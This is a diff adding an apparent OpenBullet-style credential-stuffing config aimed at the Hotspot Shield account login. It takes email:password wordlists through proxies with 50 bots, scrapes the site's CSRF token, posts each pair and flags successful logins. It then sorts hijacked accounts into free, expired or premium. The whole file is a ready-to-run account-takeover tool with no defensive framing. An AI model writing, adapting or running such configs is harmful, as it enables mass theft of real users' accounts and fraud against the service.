@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "hotspotshield_com",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-26T01:22:58.4422718+01:00",
+  "AdditionalInfo": "",
+  "Author": "legend",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_Login REQUEST GET "https://account.hotspotshield.com/" 
+  
+  HEADER "origin: https://account.hotspotshield.com" 
+  HEADER "referer: https://account.hotspotshield.com/sign-in/" 
+
+#Get_Token PARSE "<SOURCE>" LR "vxsftok: '" "'" -> VAR "TOKEN" 
+
+#Send_Login REQUEST POST "https://account.hotspotshield.com/sign-in" 
+  CONTENT "login=<USER>&pwd=<PASS>&remember=0&ajax=true&vxsftok=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://account.hotspotshield.com" 
+  HEADER "referer: https://account.hotspotshield.com/sign-in/" 
+
+#Check_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"result\":1,\"error\":null,\"debug\":null}" 
+  KEYCHAIN Failure OR 
+    KEY "{\"result\":0,\"error\":\"The username and" 
+
+#Get_Account REQUEST GET "https://account.hotspotshield.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check_Premium KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<h4>Free Membership</h4>" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "class=\"red\">Expired</span>" 
+
